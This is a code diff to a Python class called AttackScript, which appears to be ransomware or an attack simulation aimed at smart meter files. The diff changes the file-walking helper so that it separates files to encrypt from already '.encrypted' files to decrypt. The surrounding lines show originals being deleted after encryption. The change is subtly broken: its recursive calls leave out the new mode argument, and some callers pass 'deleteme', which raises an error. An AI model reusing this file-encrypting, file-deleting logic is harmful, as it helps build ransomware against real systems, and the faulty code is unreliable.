@@ -439,7 +439,7 @@ class AttackScript:
         excludeExtension = ['.py', '.pem', '.exe']
 
         try:
-            for item in self.recurseFiles(self.SMARTMETER_PATH):
+            for item in self.recurseFiles(self.SMARTMETER_PATH, 'decrypt'):
                 filePath = Path(item)
                 fileType = filePath.suffix.lower()
 
@@ -460,7 +460,7 @@ class AttackScript:
         # exclude extensions
         excludeExtension = ['.py', '.pem', '.exe']
         try:
-            for item in self.recurseFiles(self.SMARTMETER_PATH):
+            for item in self.recurseFiles(self.SMARTMETER_PATH, 'encrypt'):
                 filePath = Path(item)
                 fileType = filePath.suffix.lower()
 
@@ -514,13 +514,24 @@ class AttackScript:
             [f.write(x) for x in (encryptedSessionKey, cipher.nonce, tag, ciphertext)]
         remove(dataFile)
 
-    def recurseFiles(self, baseDirectory):
-        # Scan a directory and return a list of all files
-        for entry in scandir(baseDirectory):
-            if entry.is_file():
-                yield entry
-            else:
-                yield from self.recurseFiles(entry.path)
+    def recurseFiles(self, baseDirectory, mode):
+        if mode == 'encrypt':
+            # Scan a directory and return a list of all files excluding .encrypted files
+            for entry in scandir(baseDirectory):
+                if entry.is_file() and not entry.name.endswith(".encrypted"):
+                    yield entry
+                elif entry.is_dir():
+                    yield from self.recurseFiles(entry.path)
+        elif mode == 'decrypt':
+            # Scan a directory and return a list of all files with .encrypted
+            for entry in scandir(baseDirectory):
+                if entry.is_file() and entry.name.endswith(".encrypted"):
+                    yield entry
+                elif entry.is_dir():
+                    yield from self.recurseFiles(entry.path)
+        else:
+            raise Exception("Invalid mode")
+
 
     def decrypt(self, dataFile: Path, privatekey: bytes) -> None:
         """
@@ -878,7 +889,7 @@ class AttackScript:
             excludeExtension = ['.py', '.pem', '.exe']
 
             try:
-                for item in self.recurseFiles(self.SMARTMETER_PATH):
+                for item in self.recurseFiles(self.SMARTMETER_PATH, 'deleteme'):
                     filePath = Path(item)
                     fileType = filePath.suffix.lower()
 
@@ -1125,7 +1136,7 @@ class AttackScript:
             excludeExtension = ['.py', '.pem', '.exe']
 
             try:
-                for item in self.recurseFiles(self.SMARTMETER_PATH):
+                for item in self.recurseFiles(self.SMARTMETER_PATH, 'deleteme'):
                     filePath = Path(item)
                     fileType = filePath.suffix.lower()
 
